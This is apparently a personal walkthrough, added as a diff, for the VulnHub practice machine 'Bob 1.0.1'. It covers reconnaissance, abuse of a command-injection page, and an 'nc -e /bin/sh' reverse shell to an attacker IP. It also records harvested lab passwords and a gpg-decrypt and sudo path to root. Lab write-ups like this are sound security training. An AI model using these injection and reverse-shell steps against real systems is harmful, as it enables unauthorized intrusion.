@@ -1,0 +1,48 @@
+https://www.vulnhub.com/entry/bob-101,226/
+
+GOAL: get flag in /
+
+
+
+Information Gathering
+Name: Milburg-High
+IP Address: 192.168.83.113
+Ports: 80 (http), 25468 (ssh)
+Users: Bob/Admin, Elliot (theadminisdumb), Sebastian, Joesph (Qwerty)
+
+
+Nmap scan report for Milburg-High (192.168.83.113)
+PORT      STATE SERVICE
+80/tcp    open  http
+25468/tcp open  unknown
+
+
+
+Website data
+
+ - Dirbuster not showing anything much more than what's available and what's in the robots.txt files
+ - according to memo, logins are kept off server
+ - /dev_shell.php is going to be of use
+   *not full shell
+   *can use commands through /bin/bash | [my_cmd]
+   */bin/bash | pwd >>>>  /var/www/html 
+   *trying reverse shell with /bin/bash | nc -e /bin/sh 192.168.83.107 4444  (me: nc -lvp 4444)
+
+ - reverse shell works
+   *shows flag.txt in / directory, can't read unless root
+   *home directory: bob, elliot, jc, seb
+
+ - bob: *login.txt.gpg*, notes about staff, notes.sh (weird, check back), apparently a backdoor FTP, python scripts(useless)
+ - elliot: passwords
+ - seb: nothing
+ - jc: nothing
+
+ - ssh w/ elliot credentials, download /home/bob/login.txt.gpg & notes.sh
+ - First letter of each line in notes.sh = HARPOCRATES (maybe capital,lowercase?) maybe for gpg
+ - gpg -d login.txt.gpg > login.txt (w/ HARPOCRATES) >>>> bob:b0bcat_
+ LETS TRY IT > SUCCESS, root? > sudo su -l >>> ROOT
+
+
+
+
+
